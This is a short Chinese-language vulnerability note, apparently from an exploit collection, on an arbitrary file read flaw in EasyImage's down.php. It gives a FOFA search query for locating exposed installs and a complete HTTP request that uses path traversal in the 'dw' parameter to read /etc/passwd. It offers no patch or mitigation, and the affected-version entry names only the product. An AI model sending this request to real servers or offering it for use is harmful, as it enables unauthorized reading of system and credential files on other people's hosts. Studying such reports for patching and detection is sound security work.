# EasyImage down.php 任意文件读取漏洞

# 一、漏洞简介
EasyImage：一个简洁的开源图床程序，支持多文件上传,简单无数据库,返回图片url,markdown,bbscode,html的一款图床程序。EasyImage down.php处存在任意文件读取漏洞。

# 二、影响版本
+ EasyImage

# 三、资产测绘
+ fofa`app="EasyImage-简单图床"`
+ 特征

![1707125244360-cc612d17-1933-4111-a35d-07b9aad451e9.png](./img/Drmx3enNJaW6hyss/1707125244360-cc612d17-1933-4111-a35d-07b9aad451e9-049032.png)

# 四、漏洞复现
```plain
GET /application/down.php?dw=../../../etc/passwd HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Host: 
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
```

![1707125276920-4187c6bb-f5ee-46b2-b1bc-8b32f6ab67a7.png](./img/Drmx3enNJaW6hyss/1707125276920-4187c6bb-f5ee-46b2-b1bc-8b32f6ab67a7-888962.png)



> 更新: 2024-02-29 23:55:41  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/xvk2q1dxwph2krte>